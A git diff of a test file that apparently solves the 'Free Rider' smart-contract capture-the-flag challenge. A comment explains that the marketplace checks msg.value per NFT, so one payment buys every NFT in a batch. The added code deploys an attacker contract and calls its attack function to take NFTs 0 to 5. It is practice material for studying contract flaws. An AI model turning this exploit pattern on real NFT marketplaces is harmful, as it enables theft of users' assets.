@@ -104,7 +104,30 @@ describe('[Challenge] Free Rider', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+        /** EXPLOIT -- SOLVED */
+        /** 
+         * vulnerability: marketplace _buyOne function checks amount-paid =msg.value,
+         * thus, pay once, and withdraw all nfts in a single call to buyMany function
+         * */
+        
+        const FreeRiderChallengeFactory = await ethers.getContractFactory("FreeRiderChallenge");
+        const frc = await FreeRiderChallengeFactory.deploy(
+            this.marketplace.address,
+            this.nft.address,
+            this.uniswapPair.address,
+            this.weth.address,
+        );
+        await frc.deployed();
+
+        await frc.connect(attacker).attack(
+            this.buyerContract.address,
+            this.token.address,
+            NFT_PRICE,
+            [0, 1, 2, 3, 4, 5],
+            { value: ethers.utils.parseEther("0.1") }
+        );
+
+        console.log("attacker final balance: ",(await ethers.provider.getBalance(attacker.address)).toString());
     });
 
     after(async function () {
